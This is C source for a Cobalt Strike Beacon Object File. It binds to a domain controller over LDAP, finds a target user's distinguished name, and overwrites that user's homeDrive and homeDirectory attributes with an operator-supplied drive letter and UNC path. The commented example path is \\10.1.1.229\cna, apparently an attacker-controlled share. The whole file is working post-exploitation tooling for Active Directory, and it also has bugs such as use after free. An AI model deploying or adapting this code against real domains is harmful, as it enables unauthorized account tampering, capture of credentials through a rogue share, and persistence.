#include <windows.h>
#include <dsgetdc.h>
#include <winldap.h>
#include <rpc.h>
#include <rpcdce.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#define SECURITY_WIN32
#include <secext.h> 
#include "beacon.h"
#include "defs.h"

// compiled : x86_64-w64-mingw32-gcc -c homedirbof.c -o homedirbof.o  
// * same directory as beacon.h & defs.h


void go(char * buff, int length) {
    LDAP *ld;

    // to pass arguments from our cna function to bof
    datap parser;
    char * user;
    char * letter;
    char * path;

    BeaconDataParse(&parser, buff, length);
    user     = BeaconDataExtract(&parser, NULL);
    letter   = BeaconDataExtract(&parser, NULL);
    path     = BeaconDataExtract(&parser, NULL);

    // modify homeDirectory and homeDrive attribute
    LDAPMod homeDirectory, homeDrive;

    // create array of mods
    LDAPMod *home[3];

    char *matched_msg = NULL, *error_msg = NULL; 

    //char buf[128]; 

    int rc;

    /* Find Domain Controller for the domain (DsGetDcNameA)
       note: added ' + 2 ' to the end of the string to eliminate the two ' \\ '
       which caused a problem with binding
    */  
    DWORD dwRet;
	PDOMAIN_CONTROLLER_INFO pdcInfo;

	dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &pdcInfo);
	if (ERROR_SUCCESS == dwRet) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found Domain Controller to bind to: %s\n", pdcInfo->DomainControllerName + 2);
	    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to identify Domain Controller");
    }

	NETAPI32$NetApiBufferFree(pdcInfo);
    
    // pass simpler variable to ldap_init 
    PSTR targetdc = pdcInfo->DomainControllerName + 2;

     // Get a handle to an LDAP connection
    if ((ld = WLDAP32$ldap_init(targetdc, 389)) == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] LDAP handle connection failed", WLDAP32$ldap_init);
        return;
    } 
    // Bind to server 
    rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] bind failed: %s\n", WLDAP32$ldap_err2string(rc));
    
    } else {      
        BeaconPrintf(CALLBACK_OUTPUT, "[+] bind successful!\n");

} 
    // Find Domain DN we want to modify
                
        //GetUserNameExA is 'current' thread only - - - instead use to extract Domain DN
        // idea 'strstr' from TrustedSec : https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/src/SA/ldapsearch/entry.c
    char buf[1024] = {0};
    ULONG nSize = sizeof(buf)/sizeof(buf[0]);
    char* distinguishedName;
    
    BOOL getUser = SECUR32$GetUserNameExA(NameFullyQualifiedDN, buf, &nSize);
    
    distinguishedName = MSVCRT$strstr(buf, "DC");
    
    if(distinguishedName != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Domain dn is: %s\n", distinguishedName);	
    }
    else{
        BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve distinguished name.");
        return;

    }
                
    //reference MSDN: https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ldap/searching-a-directory        
    
    // LDAP Search
    ULONG errorCode = LDAP_SUCCESS;
    LDAPMessage *pSearchResult;
    
    //Hardcode example: PCHAR pMyFilter = "(&(objectClass=user)(objectCategory=user)(sAMAccountName=jblogg))";
    PCHAR pMyFilter;
    PCHAR pMyAttributes[6];

    //bring in format/filter from .cna
    pMyFilter = user;
    pMyAttributes[0] = "distinguishedName";
    pMyAttributes[1] = NULL;

    errorCode = WLDAP32$ldap_search_s(
                    ld,                 // Session handle
                    distinguishedName,  // DN to start search
                    LDAP_SCOPE_SUBTREE, // Scope
                    pMyFilter,          // Filter
                    pMyAttributes,      // Retrieve list of attributes
                    0,                  // Get both attributes and values
                    &pSearchResult  // [out] Search results
                    );    

    if (errorCode != LDAP_SUCCESS)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] search failed: %s\n", WLDAP32$ldap_err2string(errorCode));
        WLDAP32$ldap_unbind_s(ld);
        
        if(pSearchResult != NULL)
            WLDAP32$ldap_msgfree(pSearchResult);
    }
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[+] search was successful!\n");


    ULONG numberOfEntries;
    
    numberOfEntries = WLDAP32$ldap_count_entries(
                        ld,                 // Session handle
                        pSearchResult);     // Search result
    
    if(numberOfEntries == -1) // -1 is functions return value when it failed
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] ldap_count_entries failed\n", WLDAP32$ldap_err2string(numberOfEntries));
        WLDAP32$ldap_unbind_s(ld);
        if(pSearchResult != NULL)
            WLDAP32$ldap_msgfree(pSearchResult);
    }
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[+] The number of entries is: %d \n", numberOfEntries);

    LDAPMessage* pEntry = NULL;
    PCHAR pEntryDN = NULL;
    ULONG iCnt = 0;
    char* sMsg;
    BerElement* pBer = NULL;
    PCHAR pAttribute = NULL;
    PCHAR* ppValue = NULL;
    ULONG iValue = 0;
    PCHAR dn = NULL;
    
    for( iCnt=0; iCnt < numberOfEntries; iCnt++ )
    {
        // Get the first/next entry.
        if( !iCnt )
            pEntry = WLDAP32$ldap_first_entry(ld, pSearchResult);
        else
            pEntry = WLDAP32$ldap_next_entry(ld, pEntry);
        
        // Output a status message.
        sMsg = (!iCnt ? "[*] ldap_first_entry" : "ldap_next_entry");
        if( pEntry == NULL )
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[-]%s failed with 0x%0lx\n", sMsg);

            WLDAP32$ldap_unbind_s(ld);
            WLDAP32$ldap_msgfree(pSearchResult);
        }
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[*} fetching entry ...%s \n", pSearchResult);
        
        pAttribute = WLDAP32$ldap_first_attribute(
                      ld,       // Session handle
                      pEntry,            // Current entry
                      &pBer);            // [out] Current BerElement
        
        // Output the attribute names for the current object
        // and output values.
        while(pAttribute != NULL)
        {
            // Output the attribute name 'distinguishedName'
            BeaconPrintf(CALLBACK_OUTPUT,"[*] LDAP attribute requested: %s\n", pAttribute);
            
            // Get the string values.

            ppValue = WLDAP32$ldap_get_values(
                          ld,  // Session Handle
                          pEntry,           // Current entry
                          pAttribute);      // Current attribute

            // Print status if no values are returned (NULL ptr)
            if(ppValue == NULL)
            {
                // Output the first attribute value
                BeaconPrintf(CALLBACK_OUTPUT, ": [NO ATTRIBUTE VALUE RETURNED]");
            }

            // Output the attribute values
            else
            {
                iValue = WLDAP32$ldap_count_values(ppValue);
                if(!iValue)
                {
                    BeaconPrintf(CALLBACK_OUTPUT, ": [BAD VALUE LIST]");
                }
                else
                {
                    // Output the first attribute value
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] got it!  %s", *ppValue);
                        // I added this to convert PCHAR* to PCHAR for ldap_modify later on
                        dn = *ppValue;
                    //Output more values if available
                    ULONG z;
                    for(z=1; z<iValue; z++)
                    {
                      BeaconPrintf(CALLBACK_OUTPUT, ", %s", ppValue[z]);
                    }
                }
            }

            // Free memory.
            if(ppValue != NULL)  
                WLDAP32$ldap_value_free(ppValue);
            ppValue = NULL;
            WLDAP32$ldap_memfree(pAttribute);

            // Get next attribute name.
            pAttribute = WLDAP32$ldap_next_attribute(
                            ld,   // Session Handle
                            pEntry,            // Current entry
                            pBer);             // Current BerElement
            BeaconPrintf(CALLBACK_OUTPUT, "\n", pAttribute);
        }
        
        if( pBer != NULL )
            WLDAP32$ber_free(pBer,0);
        pBer = NULL;
    }   
    
    // cleanup
    WLDAP32$ldap_msgfree(pSearchResult);
    WLDAP32$ldap_value_free(ppValue);


    // status
    BeaconPrintf(CALLBACK_OUTPUT, "[*] ...modification to attribute started\n");

    //hardcode example: char *homeDrive_value[] = { "X:", NULL };
    char *homeDrive_value[] = { letter, NULL };
    homeDrive.mod_type = "homeDrive";
    homeDrive.mod_op = LDAP_MOD_REPLACE;
    homeDrive.mod_values = homeDrive_value;

    //hardcode example: char *homeDirectory_value[] = { "\\\\10.1.1.229\\cna", NULL };
    char *homeDirectory_value[] = { path, NULL };
    homeDirectory.mod_type = "homeDirectory";
    homeDirectory.mod_op = LDAP_MOD_REPLACE;
    homeDirectory.mod_values = homeDirectory_value; 

    home[0] = &homeDrive;
    home[1] = &homeDirectory;
    home[2] = NULL;

    // Modify attribute(s)
    rc = WLDAP32$ldap_modify_s(ld, dn, home);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] modify failed: %s\n", WLDAP32$ldap_err2string(rc));
    }
    else {      
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s - - - - > modified successfully.\n", dn);
    }

    WLDAP32$ldap_unbind_s( ld );
    return;  
}